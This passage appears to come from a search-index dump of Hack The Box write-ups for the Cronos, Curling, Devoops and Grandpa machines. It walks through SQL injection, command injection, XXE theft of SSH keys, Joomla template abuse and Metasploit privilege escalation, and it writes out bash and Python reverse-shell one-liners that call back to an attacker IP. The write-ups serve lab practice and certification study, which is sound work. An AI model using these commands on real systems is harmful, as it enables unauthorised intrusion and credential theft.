specifies the file that contains the passwords. http-post-form: we\u2019re sending a POST request. \u201c\u2026.\u201d: the content in the double quotes specifies the username/password parameters to be tested and the failed login message. If you want to see the requests that hydra is sending to confirm everything is working properly you can use the \u201c-d\u201d option. Note from the future : Hydra (with the above configuration) doesn\u2019t end up guessing any valid passwords. While this is running, let\u2019s try to see if the form is vulnerable to SQL injection. To do this manually, you can get any SQL injection cheat sheet from online. After I tried a few, the following payload in the username field successfully exploited the SQL injection vulnerability. admin # This bypasses authentication and presents us with the welcome page. Generally, you would use sqlmap to check if the application is vulnerable to SQL injection, however, since I\u2019m working towards my OSCP and sqlmap is not allowed, I had to resort to manual means. Regardless, if you want to perform the attack using sqlmap, first intercept the request using Burp and save it in a file (login.txt). Then, run sqlmap on the request. sqlmap -v 4 -r login.txt I used the verbosity level 4 so that I can see the payload sqlmap uses for each request. For the above payload we get a redirect to the welcome page. To test it out, go back to the browser and enter the payload in the username field. Then hit submit. We\u2019re presented with the login page! Now that we saw both the manual automated way of exploiting SQL injections, let\u2019s proceed with solving the box. The commands being used on the welcome page are \u201ctraceroute\u201d and \u201cping\u201d so this specific functionality of the application clearly talks to the operating system. Let\u2019s see if it\u2019s vulnerable to command injection. Add the following in the input field and execute the code. 8.8.8.8 whoami What the above command does is run the the preceding command (ping 8.8.8.8) in the background and execute the whoami command. We get back the following result. It\u2019s definitely vulnerable! The web server is running with the privileges of the web daemon user www-data. Since we can run arbitrary commands using this tool, let\u2019s get it to send a reverse shell back to our attack box. Note : It\u2019s not necessary to do this using Burp. First, intercept the request with Burp and send it to Repeater (right click Send to Repeater). Go to pentestmonkey Reverse Shell Cheat Sheet and grab the bash reverse shell. Change the IP address and port to those applicable to your attack machine. /bin/bash -i /dev/tcp/10.10.14.6/4444 0 1 Highlight the entire string and click on CTRL+U to URL encode it. Set up a listener on the attack machine. nc -nlvp 4444 Execute the request. It doesn\u2019t send a reverse shell back. Check if bash is installed on the machine. which bash It is so I\u2019m not sure why this didn\u2019t work. Let\u2019s try python. python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.10.14.6 ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]); Again, don\u2019t forget to URL encode it. We get back a low privileged shell! Let\u2019s upgrade it to a better shell. python -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Grab the user flag. We need to escalate privileges.","title":"Gaining an Initial Foothold"},{"location":"Retired/Cronos Writeup/#privilege-escalation","text":"Let\u2019s transfer the LinEnum script from our attack machine to the target machine. In the attack machine, start up a server in the same directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script. cd /tmp wget http://10.10.14.6:5555/LinEnum.sh Give it execute privileges. chmod +x LinEnum.sh Run the script. ./LinEnum.sh Considering the name of the box, I\u2019m going to focus on Crontab. If you\u2019re not familiar with the crontab format, here\u2019s a quick explanation taken from this page . We\u2019re currently running as www-data and that user usually has full privileges on the content of the directory /var/www. Let\u2019s confirm that. If you\u2019re not familiar with unix permissions, here\u2019s a great explanation. As we suspected, we own the file. Why is that good news for us? We own a file (with rwx permissions) that is running as a cron job with root privileges every minute of every hour of every month of every day of the week (that\u2019s what the * means). If we change the content of the file to send a shell back to our attack machine, the code will execute with root privileges and send us a privileged shell. The cron job is running the file using the PHP command so whatever code we add should be in PHP. Head to pentestmonkey and grab the PHP reverse shell file. You can either transfer it or create it directly in the directory. In my case, I decided to transfer it using a simple python server and renamed the file to artisan (the name of file being compiled in the cron job). cp php-reverse-shell.php artisan Set up a listener to receive the reverse shell. nc -nlvp 1234 Wait for a minute for the scheduled cron job to run and we are root! Grab the root flag. To escalate privileges in another way, transfer the linux exploit suggester script and run it on the target machine to see if your machine is vulnerable to any privilege escalation exploits. I wasn\u2019t able to successfully exploit Dirty COW on this machine but that doesn\u2019t mean it\u2019s not vulnerable. It could be vulnerable to a different variant of the exploit that I tested.","title":"Privilege Escalation"},{"location":"Retired/Cronos Writeup/#lessons-learned","text":"To gain an initial foothold on the box we exploited three vulnerabilities. The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other (not as easy) means. An SQL injection that allowed us to bypass authentication. To prevent this vulnerability from occurring, there are many defenses that can be put in place, including but not limited to the use of parametrized queries. An OS Command injection that allowed us to run arbitrary system commands on the box. Again, to prevent this vulnerability from occurring, there are many defenses that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly. To escalate to root privileges, we needed to exploit either of the following vulnerabilities. A security misconfiguration in cron that had a scheduled cron job to run a non-privileged user owned file as root. We were able to exploit this to get a privileged reverse shell sent back to our box. To avoid this vulnerability, the cron job should have been scheduled with user privileges as apposed to root privileges. Dirty COW vulnerability. This could have been avoided if the target machine was up to date on all its patches.","title":"Lessons Learned"},{"location":"Retired/Cronos Writeup/#conclusion","text":"10 machines down, 31 more to go!","title":"Conclusion"},{"location":"Retired/Curling Writeup/","text":"Curling name is probably given by the creator because the way it uses the curl to make a GET request on local files.Curling is a blog site using Joomla, a free open source content management system (CMS). The box is pretty fun and easy doesn\u2019t require lot of enumeration and it isn\u2019t too CTF like. We begin with nmap -sC -sV 10.10.10.150 Nmap scan report for 10.10.10.150 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 is open viewing the site in the browser takes us to the Curling website. There are 3 blog posts and a login form. Since we don\u2019t have any credentials till now we can try some general username password combinations, which don\u2019t work to keep our self away from hitting a dead end we enumerate directories. The web-page looks likes this and we can see one interesting thing under the first post of curling in 2018! blog post. We have what seems to be a username at the end of the post == FLORIS From our results from enumerating directories we see that there is /administrator page. Before going to that page we see the source page of 10.10.10.150 for good measure and in hope of find something. And Alas!!! we have a secret at the end of the page . Going to 10.10.10.150/secret.txt we have what appears to be a base64 encoded string decoding it gives Curling2018!. Now we have a pair of credentials which we can try on the /administrator page. Using Floris as username and Curling2018! as password we are successfully brought to the admin control panel. There are lot of things to try to get our code executed and get a shell many of the ways lead to a rabbit hole. The first thing I tried is going to /media and tried to upload a png with php code in it by renaming it to something.php.png in Burpsuite, this gave an error \u201c You have tried to upload file(s) that are not safe \u201d you can check this method in Ippsec\u2019s Popcorn video . The next thing I tried was under Install Extensions, where I installed a Simple file upload extension which i found from this [**site,]**(https://extensions.joomla.org/extension/simple-file-upload/) and tried uploading a php script after changing all the rules to let me upload a php script but again a dead end some internal Joomla function was preventing any type of php script upload. Then after a bit of googling and research i found templates can be written in php and can be executed. So under Template/styles I made beez3 default and in template section I found all the php scripts the site used and they were editable!!!! I grabbed php-reverse-shell script from git-hub . Pasted it in index.php changed the ip parameter put in my ip and in my terminal I listened on port 1234. I saved the php file. I executed the script by going to http://10.10.10.150/index.php and boom instantly I had a shell at my terminal through netcat this was still a basic reverse shell. Since this was not a full fledged shell and I was still www-data I couldn\u2019t read user.txt but in /home/floris I found 1 directory admin-area and 2 files named password_backup and user.txt running cat on these files gave me this I copied the hex dump to my machine and the initial bytes looked similar they were bzip2 compressed. So i thought this must be a simple decompressing challenge to attain the password. I did repeated decompressing on this file like this: (for more click ) So finally we have the password.txt which gives us the password 5d wdCbdZu)|hChXll using floris as username and this as the password we can successfully ssh into the machine, and can get the user flag. Now onto root, We have admin-area directory in /home/floris this admin-area contains 2 files input and report the file contents are: This seems like input is some input to some process and report is executing and displaying the outcome of this some process. To know this process properly, in the input url I put my ip and a port and listened on that port using netcat. In my terminal I could see user-Agent as curl/7.58.0 so curl was doing this GET request. I saw that curl was running with floris privileges(ps -elf| grep curl), and after reading the curl man page and a bit of googling I concluded that curl can GET local files also.I tried this on my machine as a local user in root group with a command like this curl file:///etc/shadow And I could successfully get the result even by running curl as not root.So after my little experiment I edited the input file as url=\u201dfile:///root/root.txt\u201d and when I saw the contents of the report file I was staring at the root flag. ROOTED!!!! If you had found a way to get a root shell directly without input or report file please do share with me in the comments below. I know I could have replaced url as \u201dfile:///etc/shadow\u201d and grabbed the root password.","title":"13. Curling Writeup.md"},{"location":"Retired/Devoops Writeup/","text":"The IP of this box is 10.10.10.91 NMAP Results We begin with the NMAP Scan by the command nmap -sC -sV -oA devoops 10.10.10.91 Nmap 7.70 scan initiated Wed Jun 6 02:35:31 2018 as: nmap -sV -sV -oA nmap 10.10.10.91 Nmap scan report for 10.10.10.91 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Gunicorn 19.7.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Wed Jun 6 02:36:14 2018\u20131 IP address (1 host up) scanned in 42.71 seconds As we see the 2 ports are open ,i.e, Port 22 running SSH and Port 5000 running http HTTP Services Now as we see http service running on port 5000 , we open this IP 10.10.10.91:5000 on a web browser and check the web application running Here we see nothing interesting , lets run dirb on it Dirb Now we run our dirb scan Dirb result shows two subdirectories , /feed and /upload If you face issues running dirb , it might be due to blocked USER-AGENT or something Use dirsearch tool (download from Github) which has additional parameter \u201c-random-agents\u201d /feed We try to access http://10.10.10.91:5000/feed , we get Nothing interesting in /feed , so we move to /upload /upload Now we try to access http://10.10.10.91:5000/upload Here we see we can upload some files , at first I thought it might have file upload vulnerability , so I uploaded a random photo file(.png , .jpeg or anything) and I get And as we choose file and then click on the Upload button , it doesn't gets upload As we see there is something written as XML elements: Author, Subject , Content , which strikes directly to XXE Injection , so we give it a try XXE Injection For more details on XXE , refer to OWASP TOP 10 Below is the code which we will use to exploit the XXE ?xml version=\u201d1.0\" encoding=\u201dISO-8859\u20131\"? ]> mysub mycontent ! \u2014 We have edited and (as referenced in the link of the XXE code) to , , as we clearly see that in the /upload directory says XML Elements: Author, Subject, Content which is a clear indication to use this as the XML tags \u2192 Result of the above XXE Code We intercept the traffic through Burp and see the results After choosing the exploit.xml file which contains the XXE Injection code , we click on Upload and intercept its traffic through Burp Suite and then send the request to Repeater Sending this to Repeater and clicking Go , we get Boom , we get the contents of the /etc/passwd file as we gave in the code above , now lets check the users from the contents of the /etc/passwd file As we see there is an user name \u201croosa\u201d Now we will get the ssh authentication key of the roosa user as we know from the NMAP scan that SSH is open Below is the XML Code to get the ssh authentication key for \u201croosa\u201d user ?xml version=\u201d1.0\" encoding=\u201dISO-8859\u20131\"? ]> mysub mycontent ! \u2014 We just replaced /etc/passwd from the previous code by /home/roosa/.ssh/id_rsa \u2192 Now we just modify the code in the Burp Repeater and click Go Here we get the ssh in the response body , now we copy the part from \u2014 \u2014 \u2014 \u2014 BEGIN to \u2014 \u2014 \u2014 \u2014 END RSA\u2026.. and save it to a file named \u201cid_rsa\u201d But yeah change the permission of id_rsa file to 600 using \u201cchmod 600 id_rsa\u201d Login Through SSH Now we open a terminal and connect through ssh using command \u201cssh roosa@10.10.10.91 -i id_rsa\u201d Boom !!! We are in , now lets dig further Getting User Flag The user flag was in the same directory to which we were login through ssh , just type the command ls and you will see Privilege Escalation Privilege Escalation was little tough and tricky on this machine , so lets move forward to it Searching and searching for some clues There was a script on the directory , which is a in the SS below After searching more , this wasn't useful, but yeah then we saw 2 directories which was odd , i.e , work and deploy We got a .git folder , so lets try the git log command on it and see the results Git Log Now running \u201cgit log \u201d command on the .git folder , we get Here we dont get anything interesting , lets check further by \u201cgit log -r\u201d command and scroll down , we get It says \u201creverted accidental commit with proper key\u201d which was the hint , so after googling about \u201cgit revert\u201d and more like that , i got that using the command \u201cgit log -p -6\u201d , so lets run this command and then check the results After scrolling down and down , we see something like ssh keys , one of them in green color and one of them in red The red one was the old which was reverted accidentally to the new one(which is in green color) So lets copy the red section and then save it to a file name \u201cid_rsa2\u201d , this is probably the ssh key to root Don\u2019t forget to change the permissions of the id_rsa2 file to 600 using chmod Login To Root Through SSH Now we login to root using ssh , use the command \u201cssh root@10.10.10.91 -i id_rsa2\u201d We are now root , bingo.!! Getting The Root Flag Now getting the root flag which is on the same directory to which we were logged This machine was very cool , getting user was easy but root was very tough for me Vulnerabilities Used To Solve This Box :- XXE Injection \u2192 Low Privileges Git \u2192 Root Privileges References XXE Injection Exploitation \u2192 https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection","title":"6. Devoops Writeup.md"},{"location":"Retired/Devoops Writeup/#nmap-results","text":"We begin with the NMAP Scan by the command nmap -sC -sV -oA devoops 10.10.10.91","title":"NMAP Results"},{"location":"Retired/Devoops Writeup/#nmap-770-scan-initiated-wed-jun-6-023531-2018-as-nmap-sv-sv-oa-nmap-10101091","text":"Nmap scan report for 10.10.10.91 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Gunicorn 19.7.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .","title":"Nmap 7.70 scan initiated Wed Jun 6 02:35:31 2018 as: nmap -sV -sV -oA nmap 10.10.10.91"},{"location":"Retired/Devoops Writeup/#nmap-done-at-wed-jun-6-023614-20181-ip-address-1-host-up-scanned-in-4271-seconds","text":"As we see the 2 ports are open ,i.e, Port 22 running SSH and Port 5000 running http HTTP Services Now as we see http service running on port 5000 , we open this IP 10.10.10.91:5000 on a web browser and check the web application running Here we see nothing interesting , lets run dirb on it","title":"Nmap done at Wed Jun 6 02:36:14 2018\u20131 IP address (1 host up) scanned in 42.71 seconds"},{"location":"Retired/Devoops Writeup/#dirb","text":"Now we run our dirb scan Dirb result shows two subdirectories , /feed and /upload If you face issues running dirb , it might be due to blocked USER-AGENT or something Use dirsearch tool (download from Github) which has additional parameter \u201c-random-agents\u201d","title":"Dirb"},{"location":"Retired/Devoops Writeup/#feed","text":"We try to access http://10.10.10.91:5000/feed , we get Nothing interesting in /feed , so we move to /upload","title":"/feed"},{"location":"Retired/Devoops Writeup/#upload","text":"Now we try to access http://10.10.10.91:5000/upload Here we see we can upload some files , at first I thought it might have file upload vulnerability , so I uploaded a random photo file(.png , .jpeg or anything) and I get And as we choose file and then click on the Upload button , it doesn't gets upload As we see there is something written as XML elements: Author, Subject , Content , which strikes directly to XXE Injection , so we give it a try","title":"/upload"},{"location":"Retired/Devoops Writeup/#xxe-injection","text":"For more details on XXE , refer to OWASP TOP 10 Below is the code which we will use to exploit the XXE ?xml version=\u201d1.0\" encoding=\u201dISO-8859\u20131\"? ]> mysub mycontent ! \u2014 We have edited and (as referenced in the link of the XXE code) to , , as we clearly see that in the /upload directory says XML Elements: Author, Subject, Content which is a clear indication to use this as the XML tags \u2192 Result of the above XXE Code We intercept the traffic through Burp and see the results After choosing the exploit.xml file which contains the XXE Injection code , we click on Upload and intercept its traffic through Burp Suite and then send the request to Repeater Sending this to Repeater and clicking Go , we get Boom , we get the contents of the /etc/passwd file as we gave in the code above , now lets check the users from the contents of the /etc/passwd file As we see there is an user name \u201croosa\u201d Now we will get the ssh authentication key of the roosa user as we know from the NMAP scan that SSH is open Below is the XML Code to get the ssh authentication key for \u201croosa\u201d user ?xml version=\u201d1.0\" encoding=\u201dISO-8859\u20131\"? ]> mysub mycontent ! \u2014 We just replaced /etc/passwd from the previous code by /home/roosa/.ssh/id_rsa \u2192 Now we just modify the code in the Burp Repeater and click Go Here we get the ssh in the response body , now we copy the part from \u2014 \u2014 \u2014 \u2014 BEGIN to \u2014 \u2014 \u2014 \u2014 END RSA\u2026.. and save it to a file named \u201cid_rsa\u201d But yeah change the permission of id_rsa file to 600 using \u201cchmod 600 id_rsa\u201d","title":"XXE Injection"},{"location":"Retired/Devoops Writeup/#login-through-ssh","text":"Now we open a terminal and connect through ssh using command \u201cssh roosa@10.10.10.91 -i id_rsa\u201d Boom !!! We are in , now lets dig further","title":"Login Through SSH"},{"location":"Retired/Devoops Writeup/#getting-user-flag","text":"The user flag was in the same directory to which we were login through ssh , just type the command ls and you will see","title":"Getting User Flag"},{"location":"Retired/Devoops Writeup/#privilege-escalation","text":"Privilege Escalation was little tough and tricky on this machine , so lets move forward to it","title":"Privilege Escalation"},{"location":"Retired/Devoops Writeup/#searching-and-searching-for-some-clues","text":"There was a script on the directory , which is a in the SS below After searching more , this wasn't useful, but yeah then we saw 2 directories which was odd , i.e , work and deploy We got a .git folder , so lets try the git log command on it and see the results","title":"Searching and searching for some clues"},{"location":"Retired/Devoops Writeup/#git-log","text":"Now running \u201cgit log \u201d command on the .git folder , we get Here we dont get anything interesting , lets check further by \u201cgit log -r\u201d command and scroll down , we get It says \u201creverted accidental commit with proper key\u201d which was the hint , so after googling about \u201cgit revert\u201d and more like that , i got that using the command \u201cgit log -p -6\u201d , so lets run this command and then check the results After scrolling down and down , we see something like ssh keys , one of them in green color and one of them in red The red one was the old which was reverted accidentally to the new one(which is in green color) So lets copy the red section and then save it to a file name \u201cid_rsa2\u201d , this is probably the ssh key to root Don\u2019t forget to change the permissions of the id_rsa2 file to 600 using chmod","title":"Git Log"},{"location":"Retired/Devoops Writeup/#login-to-root-through-ssh","text":"Now we login to root using ssh , use the command \u201cssh root@10.10.10.91 -i id_rsa2\u201d We are now root , bingo.!!","title":"Login To Root Through SSH"},{"location":"Retired/Devoops Writeup/#getting-the-root-flag","text":"Now getting the root flag which is on the same directory to which we were logged This machine was very cool , getting user was easy but root was very tough for me","title":"Getting The Root Flag"},{"location":"Retired/Devoops Writeup/#vulnerabilities-used-to-solve-this-box-","text":"XXE Injection \u2192 Low Privileges Git \u2192 Root Privileges","title":"Vulnerabilities Used To Solve This Box :-"},{"location":"Retired/Devoops Writeup/#references","text":"XXE Injection Exploitation \u2192 https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection","title":"References"},{"location":"Retired/Grandpa Writeup/","text":"This is the 35th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.14 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.14 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up (0.043s latency). Not shown: 999 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up (0.037s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Error | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | Server Date: Mon, 17 Feb 2020 20:31:32 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_ WebDAV type: Unknown Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up. All 1000 scanned ports on 10.10.10.14 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.72 seconds \u200b \u200b ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:32 EST Initiating Parallel DNS resolution of 1 host. at 15:32 Completed Parallel DNS resolution of 1 host. at 15:32, 0.43s elapsed Initiating SYN Stealth Scan at 15:32 Scanning 10.10.10.14 [65535 ports] Discovered open port 80/tcp on 10.10.10.14 .... Nmap scan report for 10.10.10.14 Host is up (0.039s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 263.21 seconds Raw packets sent: 131268 (5.776MB) | Rcvd: 214 (10.752KB) No new ports ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:37 EST /usr/local/bin/nmapAutomator.sh: line 226: 2251 Segmentation fault $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo ${ports} ) -oN nmap/CVEs_ $1 .nmap $1 Running Vuln scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:37 EST /usr/local/bin/nmapAutomator.sh: line 226: 2253 Segmentation fault $nmapType -sV --script vuln -p$(echo ${ports} ) -oN nmap/Vulns_ $1 .nmap $1 ---------------------Recon Recommendations---------------------- Web Servers Recon: gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u [http://10.10.10.14:80](http://10.10.10.14:80) -o recon/gobuster_10.10.10.14_80.txt nikto -host 10.10.10.14:80 | tee recon/nikto_10.10.10.14_80.txt Which commands would you like to run? All (Default), gobuster, nikto, Skip ! Running Default in (1) s: ---------------------Running Recon Commands---------------------- Starting gobuster scan =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.14:80](http://10.10.10.14:80) [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Extensions: html,asp,php [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/02/17 15:38:11 Starting gobuster =============================================================== [http://10.10.10.14:80/_vti_bin](http://10.10.10.14:80/_vti_bin) (Status: 301) [Size: 158] [http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll](http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll) (Status: 200) [Size: 195] [http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll](http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll) (Status: 200) [Size: 195] [http://10.10.10.14:80/_vti_bin/shtml.dll](http://10.10.10.14:80/_vti_bin/shtml.dll) (Status: 200) [Size: 96] =============================================================== 2020/02/17 15:39:06 Finished =============================================================== Finished gobuster scan ========================= Starting nikto scan - Nikto v2.1.6 -------------------------------------------------------------------- + Target IP: 10.10.10.14 + Target Hostname: 10.10.10.14 + Target Port: 80 + Start Time: 2020-02-17 15:39:07 (GMT-5) -------------------------------------------------------------------- + Server: Microsoft-IIS/6.0 + Retrieved microsoftofficewebserver header: 5.0_Pub + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + Uncommon header microsoftofficewebserver found, with contents: 5.0_Pub + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use -C all to force check all possible dirs) + Retrieved dasl header: DAV:sql + Retrieved dav header: 1, 2 + Retrieved ms-author-via header: MS-FP/4.0,DAV + Uncommon header ms-author-via found, with contents: MS-FP/4.0,DAV + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Public Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Public Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Public Header): MOVE may allow clients to change file locations on the web server. + WebDAV enabled (PROPPATCH COPY LOCK PROPFIND MKCOL UNLOCK SEARCH listed as allowed) + OSVDB-13431: PROPFIND HTTP verb may show the server s internal IP address: [http://10.10.10.14/](http://10.10.10.14/) + OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. + OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376). [http://www.securityfocus.com/bid/2252](http://www.securityfocus.com/bid/2252). + OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST. + /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found. + Retrieved x-aspnet-version header: 1.1.4322 + 8014 requests: 0 error(s) and 22 item(s) reported on remote host + End Time: 2020-02-17 15:45:00 (GMT-5) (353 seconds) -------------------------------------------------------------------- + 1 host(s) tested Finished nikto scan ========================= \u200b \u200b ---------------------Finished all Nmap scans--------------------- Completed in 15 minute(s) and 46 second(s) We have one port open. Port 80: running Microsoft IIS httpd 6.0 Before we move on to enumeration, let\u2019s make some mental notes about the scan results. The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server. Enumeration Visit the web application in the browser. Look into the directories/files that gobuster found. We don\u2019t find anything useful. Next, let\u2019s test the allowed HTTP methods. The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is an IIS Microsoft web server, the type of files it executes are ASP and ASPX. So let\u2019s check if we\u2019re allowed to upload these file extensions. davtest --url [http://10.10.10.1](http://10.10.10.15/)4 We get back the following result. Unlike the Granny box , there are restrictions put in place that don\u2019t allow us to upload files, so this won\u2019t be the way we gain initial access to the box. Next, let\u2019s run searchsploit on the web server version. Microsoft IIS 6.0 is vulnerable to a remote buffer overflow. Note : Several people I know have tried to solve this box without using Metasploit and have failed to because the shell you get back is too unstable. Therefore, I\u2019ll be solving this box using Metasploit. Initial Foothold Start up Metasploit. msfconsole Viewing the exploit on exploitdb we get a CVE # 2017\u20137269 . Let\u2019s see if Metasploit has an exploit for it. It does. Let\u2019s switch to that exploit and configure the RHOST to the Grandpa IP address. Then run the exploit. We get a shell! However, when we run the \u201c getuid \u201d command, we get an operation failed error. This is because we\u2019re running in an unstable process. To fix that, let\u2019s see which processes are running on the box and migrate to one that is running with the same privileges that the meterpreter session is running with. Let\u2019s migrate to process # 2172 and try running the \u201c getuid \u201d command again. Perfect! We have a stable working meterpreter session. We\u2019re running with low privileges, so we\u2019ll need to escalate our privileges to SYSTEM. Privilege Escalation Background the meterpreter session. We\u2019ll use the Local Exploit Suggester module to check the box for local vulnerabilities. Run the Local Exploit Suggester. We\u2019ll use MS14\u2013070 to escalate privileges. The exploit was successful! Let\u2019s go back and enter our meterpreter session and view our privilege level. We\u2019re SYSTEM! Grab the user.txt and root.txt flags. Lessons Learned We gained initial access to the machine and escalated privileges by exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software! Conclusion 35 machines down, 11 more to go!","title":"37. Grandpa Writeup.md"},{"location":"Retired/Grandpa Writeup/#reconnaissance","text":"Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.14 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.14 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up (0.043s latency). Not shown: 999 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up (0.037s latency). PORT STATE 